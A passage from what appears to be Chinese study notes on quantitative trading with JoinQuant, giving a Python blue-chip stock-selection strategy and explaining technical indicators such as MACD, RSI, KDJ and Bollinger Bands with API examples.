<li>总市值从大到小排列</li>
</ol>
</blockquote>
<p>按照上面的策略code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment">##初始化函数，设定要操作的股票、基准等</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定沪深300为基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    <span class="comment">#开启动态复权模式</span></span><br><span class="line">    set_option(<span class="string">&#x27;use_real_price&#x27;</span>,<span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#设定成交量比例</span></span><br><span class="line">    set_option(<span class="string">&#x27;order_volume_ratio&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#设定股票交易手续费</span></span><br><span class="line">    set_order_cost(OrderCost(open_tax=<span class="number">0</span>,close_tax=<span class="number">0.001</span>,</span><br><span class="line">    open_commission=<span class="number">0.0003</span>,close_commission=<span class="number">0.0003</span>,</span><br><span class="line">    close_today_commission=<span class="number">0</span>,min_commission=<span class="number">5</span>),<span class="built_in">type</span>=<span class="string">&#x27;stock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设定持仓数量</span></span><br><span class="line">    g.stocknum = <span class="number">20</span></span><br><span class="line">    <span class="comment">#交易日计时器</span></span><br><span class="line">    g.days = <span class="number">20</span></span><br><span class="line">    <span class="comment">#调仓频率</span></span><br><span class="line">    g.refresh_rate = <span class="number">100</span></span><br><span class="line">    <span class="comment">#运行函数</span></span><br><span class="line">    run_daily(trade, <span class="string">&#x27;every_bar&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">##筛选逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_stocks</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定查询条件</span></span><br><span class="line">    q = query(</span><br><span class="line">        indicator.code,</span><br><span class="line">        valuation.capitalization,</span><br><span class="line">        indicator.roe,</span><br><span class="line">        indicator.gross_profit_margin,</span><br><span class="line">        ).<span class="built_in">filter</span>(</span><br><span class="line">            <span class="comment">#1、总市值&gt;50亿</span></span><br><span class="line">            valuation.capitalization &gt; <span class="number">50</span>,</span><br><span class="line">            <span class="comment">#3、流通盘比率大于95%</span></span><br><span class="line">            valuation.circulating_market_cap &gt; valuation.market_cap*<span class="number">0.95</span>,</span><br><span class="line">            <span class="comment">#4、销售毛利率&gt;20%</span></span><br><span class="line">            indicator.gross_profit_margin &gt; <span class="number">20</span>,</span><br><span class="line">            <span class="comment">#5、ROE &gt; 20%</span></span><br><span class="line">            indicator.roe &gt; <span class="number">20</span>,</span><br><span class="line">            ).order_by(</span><br><span class="line">                <span class="comment">#按照市值倒序</span></span><br><span class="line">                valuation.market_cap.desc()</span><br><span class="line">                ).limit(</span><br><span class="line">                    <span class="number">100</span></span><br><span class="line">                    )</span><br><span class="line">    df = get_fundamentals(q,statDate=<span class="built_in">str</span>(context.current_dt)[:<span class="number">4</span>])</span><br><span class="line">    buylist = <span class="built_in">list</span>(df[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">    <span class="comment">#2、上市天数&gt;750</span></span><br><span class="line">    buylist = delect_stock(buylist,context.current_dt,<span class="number">750</span>)</span><br><span class="line">    buylist = filter_paused_stock(buylist)[:<span class="number">20</span>]</span><br><span class="line">    <span class="keyword">return</span> buylist</span><br><span class="line">    </span><br><span class="line"><span class="comment">##过滤停牌股票</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_paused_stock</span>(<span class="params">stock_list</span>):</span><br><span class="line">    current_date = get_current_data()</span><br><span class="line">    <span class="keyword">return</span> [stock <span class="keyword">for</span> stock <span class="keyword">in</span> stock_list <span class="keyword">if</span> <span class="keyword">not</span> current_date[stock].paused]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">##排除次新</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delect_stock</span>(<span class="params">stocks,begin,n=<span class="number">180</span></span>):</span><br><span class="line">    <span class="comment">#去除上市距begin不足n天的股票</span></span><br><span class="line">    stockList=[]</span><br><span class="line">    <span class="keyword">for</span> stock <span class="keyword">in</span> stocks:</span><br><span class="line">        start_date = get_security_info(stock).start_date</span><br><span class="line">        <span class="keyword">if</span> start_date &lt; (begin - timedelta(days=n)).date():</span><br><span class="line">            stockList.append(stock)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> stockList</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trade</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="keyword">if</span> g.days % g.refresh_rate == <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#白马股选股</span></span><br><span class="line">        stockList = check_stocks(context)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;stockList:&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(stockList))</span><br><span class="line">        <span class="comment">#获取持仓列表</span></span><br><span class="line">        sell_list = <span class="built_in">list</span>(context.portfolio.positions.keys())</span><br><span class="line">        </span><br><span class="line">        sells = <span class="built_in">list</span>(<span class="built_in">set</span>(sell_list).difference(<span class="built_in">set</span>(stockList)))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#先卖再买</span></span><br><span class="line">        <span class="keyword">for</span> stock <span class="keyword">in</span> sells:</span><br><span class="line">            order_target_value(stock,<span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#分配资金</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(context.portfolio.positions) &lt; g.stocknum:</span><br><span class="line">            num = g.stocknum - <span class="built_in">len</span>(context.portfolio.positions)</span><br><span class="line">            cash = context.portfolio.cash / num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cash = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> stock <span class="keyword">in</span> stockList:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(context.portfolio.positions) &lt; g.stocknum <span class="keyword">and</span> stock <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">                    order_value(stock,cash)</span><br><span class="line">                </span><br><span class="line">        <span class="comment">#更新天数计数器</span></span><br><span class="line">        g.days = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g.days += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="营收因子"><a href="#营收因子" class="headerlink" title="营收因子"></a>营收因子</h2><ol>
<li><strong>财务因素</strong>: 通常包括成长类因素、价值类因素以及质量类因素。</li>
<li><strong>成长类因素</strong>: 在财务因素选股中，常用的方法是选择成长类因素进行选股，包括营收因素与利润因素。</li>
<li><strong>规模类因素</strong>: 反映公司规模情况，主要用于体现市场价值大小，对投资收益产生影响，包括总市值和流通市值</li>
<li><strong>价值类因素</strong>: 价值投资是一种长期的投资策略，通常是购买那些相对低估的股票，主要基于基本面标准。价值类因素包括市净率、市销率，以及市盈率等指标。</li>
<li><strong>质量类因素</strong>: 质量类因素与股票的财务质量、资本结构相关，主要用于评估公司整体的财务健康状态。质量类因素包括净资产收益率，以及总资产净利率等指标。</li>
</ol>
<h1 id="量化择时"><a href="#量化择时" class="headerlink" title="量化择时"></a>量化择时</h1><p>概述：采用量化的方式判断买点和卖点</p>
<p><strong>趋势量化择时</strong>——基本思想基于<strong>技术分析</strong>，前提时你得承认有一定的规律（那三个假设）</p>
<p><strong>市场情绪量化择时</strong>——利用投资者的热情程度来判断大势方向</p>
<p>后者舍去（一堆散户在哪里他能涨吗）</p>
<p>前者：通过考虑市场的多个方面建立一个数学模型，并给出完整的数学公式</p>
<ol>
<li>技术趋势指标是识别和追踪有趋势的图形类指标，其特点是<strong>不试图捕捉顶底</strong>，如均线指标、MACD指标等。</li>
<li>反趋势指标又称为<strong>振荡指标</strong>，是识别和追踪趋势运行的转折点的图形类指标，其特点是<strong>具有强烈的顶底</strong>的意义，对市场转折点较敏感，如随机指标KDJ、强弱指标RSI等。</li>
<li>压力支撑指标，又称通道指标，是通过顶部轨道线和底部轨道线，试图捕捉行情的顶部和底部的图形类指标，其特点是具<strong>有明显的压力线，也有明显的支撑线</strong>，如布林带 BOLL 指标、XS 藤斯通道指标。</li>
<li>量价指标就是通过成交量变动来分析价格未来走势的图形类指标，其特点是<strong>分析成交量与价格波动的关系</strong>，如 OBV 能量潮指标、VOL 成交量指标等。</li>
</ol>
<h2 id="趋势指标"><a href="#趋势指标" class="headerlink" title="趋势指标"></a>趋势指标</h2><h3 id="MACD-1"><a href="#MACD-1" class="headerlink" title="MACD"></a>MACD</h3><p>即平滑异同移动平均线，是由美国投资家杰拉尔德·阿佩尔在 20 世纪 70 年代末提出的，主要表示经过平滑处理后线的差异程度。一般用来判断<strong>股票价格变化的方向、强度和趋势</strong>。</p>
<p>快线 DIFF 上穿慢线 DEA，<strong>红柱出现的第一天</strong>，称为<strong>金叉</strong>，是买进持有的时机；</p>
<p>快线 DIFF 下穿慢线 DEA，<strong>绿柱出现的第一天</strong>，称为<strong>死叉</strong>，是卖出空仓的时机。</p>
<p><code>MACD(security_list, check_date, SHORT = 12, LONG = 26, MID = 9)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>SHORT：统计的天数 SHORT</li>
<li>LONG：统计的天数 LONG</li>
<li>MID：统计的天数 MID</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>DIF, DEA和MACD的值</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如：({‘000001.XSHE’: 0.024474457964069884, ‘603177.XSHG’: nan, ‘000002.XSHE’: 1.9534717416190936, ‘601211.XSHG’: -0.13735007291032986}, {‘000001.XSHE’: 0.031674925444633864, ‘603177.XSHG’: nan, ‘000002.XSHE’: 1.4784672678080988, ‘601211.XSHG’: -0.020490844872792721}, {‘000001.XSHE’: -0.014400934961127959, ‘603177.XSHG’: nan, ‘000002.XSHE’: 0.95000894762198973, ‘601211.XSHG’: -0.23371845607507427})</li>
</ul>
<p><strong>备注：</strong></p>
<ul>
<li>计算方式与通达信、东方财富和同花顺相同</li>
</ul>
<p><strong>用法注释：</strong></p>
<p>DIFF线　收盘价短期、长期指数平滑移动平均线间的差 DEA线　 DIFF线的M日指数平滑移动平均线 MACD线　DIFF线与DEA线的差，彩色柱状线 参数：SHORT(短期)、LONG(长期)、M 天数，一般为12、26、9</p>
<p>用法： 1.DIFF、DEA均为正，DIFF向上突破DEA，买入信号。 2.DIFF、DEA均为负，DIFF向下跌破DEA，卖出信号。 3.DEA线与K线发生背离，行情反转信号。 4.分析MACD柱状线，由红变绿(正变负)，卖出信号；由绿变红，买入信号</p>
<p><strong>示例：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义股票池列表</span></span><br><span class="line">security_list1 = <span class="string">&#x27;000001.XSHE&#x27;</span></span><br><span class="line">security_list2 = [<span class="string">&#x27;000001.XSHE&#x27;</span>,<span class="string">&#x27;000002.XSHE&#x27;</span>,<span class="string">&#x27;601211.XSHG&#x27;</span>,<span class="string">&#x27;603177.XSHG&#x27;</span>]</span><br><span class="line"><span class="comment"># 计算并输出 security_list1 的 MACD 值</span></span><br><span class="line">macd_dif, macd_dea, macd_macd = MACD(security_list1,check_date=<span class="string">&#x27;2017-01-04&#x27;</span>, SHORT = <span class="number">12</span>, LONG = <span class="number">26</span>, MID = <span class="number">9</span>)</span><br><span class="line"><span class="built_in">print</span> macd_dif[security_list1]</span><br><span class="line"><span class="built_in">print</span> macd_dea[security_list1]</span><br><span class="line"><span class="built_in">print</span> macd_macd[security_list1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 security_list2 的 MACD 值</span></span><br><span class="line">macd_dif, macd_dea, macd_macd = MACD(security_list2,check_date=<span class="string">&#x27;2017-01-04&#x27;</span>, SHORT = <span class="number">12</span>, LONG = <span class="number">26</span>, MID = <span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> stock <span class="keyword">in</span> security_list2:</span><br><span class="line">    <span class="built_in">print</span> macd_dif[stock]</span><br><span class="line">    <span class="built_in">print</span> macd_dea[stock]</span><br><span class="line">    <span class="built_in">print</span> macd_macd[stock]</span><br></pre></td></tr></table></figure>

<h3 id="UOS"><a href="#UOS" class="headerlink" title="UOS"></a>UOS</h3><p>即终极波动指标。UOS指标是一种多功能的指标，除了超买超卖方面的作用之外，它的“突破”讯号不仅可以提供最适当的交易时机之外，更可以进一步强化指标的可靠度。</p>
<ol>
<li><p>TH &#x3D; 今日最高价和昨日收盘价的较大值  </p>
</li>
<li><p>TL &#x3D; 今日最低价和昨日收盘价的较小值  </p>
</li>
<li><p>ACCC1 &#x3D; (收盘价 - TL) 的 N1 日累和 &#x2F; (TH - TL) 的 N1 日累和<br>ACCC2 &#x3D; (收盘价 - TL) 的 N2 日累和 &#x2F; (TH - TL) 的 N2 日累和<br>ACCC3 &#x3D; (收盘价 - TL) 的 N3 日累和 &#x2F; (TH - TL) 的 N3 日累和  </p>
</li>
<li><p>UOS &#x3D; (ACCC1 * N2 * N3 + ACCC2 * N1 * N3 + ACCC3 * N1 * N2) * 100 &#x2F; (N1 * N2 + N1 * N3 + N2 * N3)  </p>
</li>
<li><p>MAUOS &#x3D; UOS 的 M 日指数平滑移动平均  </p>
</li>
<li><p>参考 N1 &#x3D; 7, N2 &#x3D; 14, N3 &#x3D; 28, M &#x3D; 6</p>
</li>
</ol>
<ul>
<li>UOS短线拐底：UOS上穿50  </li>
<li>UOS短线卖顶：UOS下穿65  </li>
<li>UOS中长期拐底：UOS上穿35  </li>
<li>UOS中长期卖顶：UOS下穿70</li>
</ul>
<p><a href="https://www.joinquant.com/help/api/help#UOS-%E7%BB%88%E6%9E%81%E6%8C%87%E6%A0%87">参考代码</a></p>
<h3 id="MA"><a href="#MA" class="headerlink" title="MA"></a>MA</h3><p><strong>均线——葛兰碧法则</strong></p>
<ul>
<li><p>平均线从下下降逐渐转为走平，而价格从下方突破平均线，为买进信号  </p>
</li>
<li><p>价格虽然跌破平均线，但是又立刻回升到平均线上，此时平均线仍然持续上涨，仅为买进信号  </p>
</li>
<li><p>价格趋势走在平均线上，价格下跌并未跌破平均线且立刻反转上升，为买进信号  </p>
</li>
<li><p>价格突然暴跌，跌破平均线，且远离平均线，则有可能反弹上升，为买进时机  </p>
</li>
<li><p>平均线从上升逐渐转为盘局或下跌，而价格向下跌破平均线，为卖出信号  </p>
</li>
<li><p>价格虽然向上突破平均线，但是又立刻回跌至平均线下，此时平均线仍然持续的下降，仅为卖出信号  </p>
</li>
<li><p>价格趋势走在平均线下，价格上升并未突破平均线且立刻反转下跌，也是卖出信号  </p>
</li>
<li><p>价格突然暴涨，突破平均线，且远离平均线，则有可能反弹回调，也为卖出时机</p>
</li>
</ul>
<p>看看就好</p>
<p><code>MA(security_list, check_date, timeperiod=5, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>timeperiod：统计的天数timeperiod</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>MA 的值。</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如：{‘000001.XSHE’: 9.2599999999999998, ‘603177.XSHG’: nan, ‘000002.XSHE’: 20.68, ‘601211.XSHG’: 18.704000000000001}</li>
</ul>
<p><strong>备注：</strong></p>
<ul>
<li>计算方式与通达信，同花顺和东方财富相同</li>
</ul>
<p><strong>用法注释：</strong></p>
<p>1.股价高于平均线，视为强势；股价低于平均线，视为弱势 2.平均线向上涨升，具有助涨力道；平均线向下跌降，具有助跌力道； 3.二条以上平均线向上交叉时，买进； 4.二条以上平均线向下交叉时，卖出； 5.移动平均线的信号经常落后股价，若以EXPMA 、VMA 辅助，可以改善。</p>
<h3 id="VMA"><a href="#VMA" class="headerlink" title="VMA"></a>VMA</h3><p>变异平均线</p>
<p><code>VMA(security_list, check_date, timeperiod = 12, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date: 要查询数据的日期</li>
<li>timeperiod：统计的天数</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>VMA的值</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如：{‘000001.XSHE’: 8.3202083333333334, ‘603177.XSHG’: nan, ‘000002.XSHE’: 18.979166666666668, ‘601211.XSHG’: 16.474166666666669}</li>
</ul>
<p><strong>备注：</strong></p>
<ul>
<li>计算方式与通达信和同花顺相同，东方财富没有该指标</li>
</ul>
<p><strong>用法注释：</strong></p>
<ol>
<li>股价高于平均线，视为强势；股价低于平均线，视为弱势；</li>
<li>平均线向上涨升，具有助涨力道；平均线向下跌降，具有助跌力道；</li>
<li>二条以上平均线向上交叉时，买进；</li>
<li>二条以上平均线向下交叉时，卖出；</li>
<li>VMA 比一般平均线的敏感度更高，消除了部份平均线落后的缺陷。</li>
</ol>
<h2 id="反趋向指标"><a href="#反趋向指标" class="headerlink" title="反趋向指标"></a>反趋向指标</h2><h3 id="RSI"><a href="#RSI" class="headerlink" title="RSI"></a>RSI</h3><p><strong>RSI</strong>:即相对强弱指标，是期货市场和股票市场中最为著名的动量指标。显示的是股价向上波动的幅度占总的波动幅度的百分比。如果其数值大，就表示市场处于强势状态，如果数值小，则表示市场处于弱势。</p>
<p>计算公式：NRSI &#x3D; A &#x2F; (A + B) × 100</p>
<p>A &#x3D; N日内上涨的平均值之和；B &#x3D; N日内下跌的平均值之和（取正值）</p>
<p>由于上面的公式对RSI的定义较为明确，即<strong>上涨的力量与下跌的力量进行比较</strong>，显然，上涨的力量越大，对应计算出的指数越上升；而下跌的力量越大，则对应指数出市场的弱势。</p>
<p><strong>策略L:</strong></p>
<ul>
<li>RSI &gt; 80 为超买，RSI &lt; 20 为超卖</li>
<li>RSI 以50为中界线，大于50为多头行情，小于50为空头行情</li>
<li>RSI 在80以上形成M头或顶部形态时，为向下反转信号</li>
<li>RSI 在20以下形成W底或底部形态时，为向上反转信号</li>
</ul>
<p><code>RSI(security_list, check_date, N1=6, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>N1：统计的天数N1</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>RSI 的值。</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如： {‘000001.XSHE’: 86.697784941552129, ‘603177.XSHG’: nan, ‘000002.XSHE’: 45.669839353084029, ‘601211.XSHG’: 65.952531344607962}</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jqlib.technical_analysis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">security_list = [<span class="string">&#x27;000001.XSHE&#x27;</span>,<span class="string">&#x27;000002.XSHE&#x27;</span>,<span class="string">&#x27;601211.XSHG&#x27;</span>]</span><br><span class="line">_RSI = RSI(security_list,check_date=<span class="string">&#x27;2022-09-01&#x27;</span>,N1=<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> stock <span class="keyword">in</span> security_list:</span><br><span class="line">    <span class="built_in">print</span>(stock,<span class="string">&#x27;2022-09-01RSI=&#x27;</span>,_RSI[stock])</span><br></pre></td></tr></table></figure>

<h3 id="KDJ-1"><a href="#KDJ-1" class="headerlink" title="KDJ"></a>KDJ</h3><p>定义前面有，用的非常多</p>
<p><code>KDJ(security_list, check_date, N =9, M1=3, M2=3, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>N：统计的天数 N</li>
<li>M1：统计的天数 M1</li>
<li>M2：统计的天数 M2</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>K，D和J 的值。</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如：({‘000001.XSHE’: 89.145187806127595, ‘603177.XSHG’: nan, ‘000002.XSHE’: 20.523907534762358, ‘601211.XSHG’: 82.545216532766361}, {‘000001.XSHE’: 82.915346288340473, ‘603177.XSHG’: nan, ‘000002.XSHE’: 21.246652224886216, ‘601211.XSHG’: 80.903864946907802}, {‘000001.XSHE’: 101.60487084170185, ‘603177.XSHG’: nan, ‘000002.XSHE’: 19.078418154514644, ‘601211.XSHG’: 85.827919704483492})</li>
</ul>
<p><strong>用法注释：</strong></p>
<ol>
<li><p>指标&gt;80 时，回档机率大；指标&lt;20时，反弹机率大；</p>
</li>
<li><p>K在20左右向上交叉D时，视为买进信号； </p>
</li>
<li><p>K在80左右向下交叉D时，视为卖出信号； </p>
</li>
<li><p>J&gt;100 时，股价易反转下跌；J&lt;0 时，股价易反转上涨； </p>
</li>
<li><p>KDJ 波动于50左右的任何信号，其作用不大。</p>
</li>
</ol>
<h2 id="压力支撑指标"><a href="#压力支撑指标" class="headerlink" title="压力支撑指标"></a>压力支撑指标</h2><h3 id="BOLL"><a href="#BOLL" class="headerlink" title="BOLL"></a>BOLL</h3><p><code>Bollinger_Bands(security_list, check_date, timeperiod=20, nbdevup=2, nbdevdn=2, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>timeperiod：统计的天数timeperiod</li>
<li>nbdevup：统计的天数 nbdevup</li>
<li>nbdevdn：统计的天数 nbdevdn</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>上轨线UB 、中轨线MB、下轨线LB 的值。</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如： ({‘000001.XSHE’: 9.2899945886169739, ‘603177.XSHG’: nan, ‘000002.XSHE’: 21.378028110909778, ‘601211.XSHG’: 18.846866409164456}, {‘000001.XSHE’: 9.1745000000000037, ‘603177.XSHG’: nan, ‘000002.XSHE’: 20.795500000000004, ‘601211.XSHG’: 18.423999999999999}, {‘000001.XSHE’: 9.0590054113830334, ‘603177.XSHG’: nan, ‘000002.XSHE’: 20.21297188909023, ‘601211.XSHG’: 18.001133590835543})</li>
</ul>
<p><strong>备注：</strong></p>
<ul>
<li>计算方式与通达信、东方财富和同花顺相同</li>
</ul>
<p><strong>用法注释：</strong></p>
<ol>
<li><p>股价上升穿越布林线上限时，回档机率大； </p>
</li>
<li><p>股价下跌穿越布林线下限时，反弹机率大； </p>
</li>
<li><p>布林线震动波带变窄时，表示变盘在即； </p>
</li>
<li><p>BOLL须配合BB 、WIDTH 使用；</p>
</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义股票池列表</span></span><br><span class="line">security_list1 = <span class="string">&#x27;000001.XSHE&#x27;</span></span><br><span class="line">security_list2 = [<span class="string">&#x27;000001.XSHE&#x27;</span>,<span class="string">&#x27;000002.XSHE&#x27;</span>,<span class="string">&#x27;601211.XSHG&#x27;</span>,<span class="string">&#x27;603177.XSHG&#x27;</span>]</span><br><span class="line"><span class="comment"># 计算并输出 security_list1 的 BOLL 值</span></span><br><span class="line">upperband, middleband, lowerband = Bollinger_Bands(security_list1, check_date=<span class="string">&#x27;2017-01-04&#x27;</span>, timeperiod=<span class="number">20</span>, nbdevup=<span class="number">2</span>, nbdevdn=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span> upperband[security_list1]</span><br><span class="line"><span class="built_in">print</span> middleband[security_list1]</span><br><span class="line"><span class="built_in">print</span> lowerband[security_list1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 security_list2 的 BOLL 值</span></span><br><span class="line">upperband, middleband, lowerband = Bollinger_Bands(security_list2, check_date=<span class="string">&#x27;2017-01-04&#x27;</span>, timeperiod=<span class="number">20</span>, nbdevup=<span class="number">2</span>, nbdevdn=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> stock <span class="keyword">in</span> security_list2:</span><br><span class="line">    <span class="built_in">print</span> upperband[stock]</span><br><span class="line">    <span class="built_in">print</span> middleband[stock]</span><br><span class="line">    <span class="built_in">print</span> lowerband[stock]</span><br></pre></td></tr></table></figure>

<h2 id="量价指标"><a href="#量价指标" class="headerlink" title="量价指标"></a>量价指标</h2><h3 id="OBV"><a href="#OBV" class="headerlink" title="OBV"></a>OBV</h3><p><a href="https://www.joinquant.com/help/api/help#OBV-%E7%B4%AF%E7%A7%AF%E8%83%BD%E9%87%8F%E7%BA%BF">参考连接</a></p>
<h3 id="VOL"><a href="#VOL" class="headerlink" title="VOL"></a>VOL</h3><p>成交量指标：</p>
<p><strong>用法注释：</strong></p>
<ol>
<li>成交量大，代表交投热络，可界定为热门股；</li>
<li>底部起涨点出现大成交量(成交手数)，代表攻击量；</li>
<li>头部地区出现大成交量(成交手数)，代表出货量；</li>
<li>观察成交金额的变化，比观察成交手数更具意义，因为成交手数并未反应股价的涨跌的后所应支出的实际金额。</li>
</ol>
<p><a href="https://www.joinquant.com/help/api/help#VOL-%E6%88%90%E4%BA%A4%E9%87%8F">参考链接</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jqlib.technical_analysis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义股票池列表</span></span><br><span class="line">security_list = [<span class="string">&#x27;000001.XSHE&#x27;</span>,<span class="string">&#x27;000002.XSHE&#x27;</span>]</span><br><span class="line">check_dates = [<span class="string">&#x27;2022-10-31&#x27;</span>,<span class="string">&#x27;2022-11-01&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> check_date <span class="keyword">in</span> check_dates:</span><br><span class="line">    <span class="keyword">for</span> security <span class="keyword">in</span> security_list:</span><br><span class="line">        _VOL,MAVOL1,MAVOL2 = VOL(security,check_date=check_date,M1=<span class="number">5</span>,M2=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(check_date,<span class="string">f&#x27;<span class="subst">&#123;security&#125;</span>的VOL:&#x27;</span>,_VOL[security])</span><br><span class="line">        <span class="built_in">print</span>(check_date,<span class="string">f&#x27;<span class="subst">&#123;security&#125;</span>的MOVAL1:&#x27;</span>,MAVOL1[security])</span><br><span class="line">        <span class="built_in">print</span>(check_date,<span class="string">f&#x27;<span class="subst">&#123;security&#125;</span>的MOVAL2:&#x27;</span>,MAVOL2[security])</span><br></pre></td></tr></table></figure>

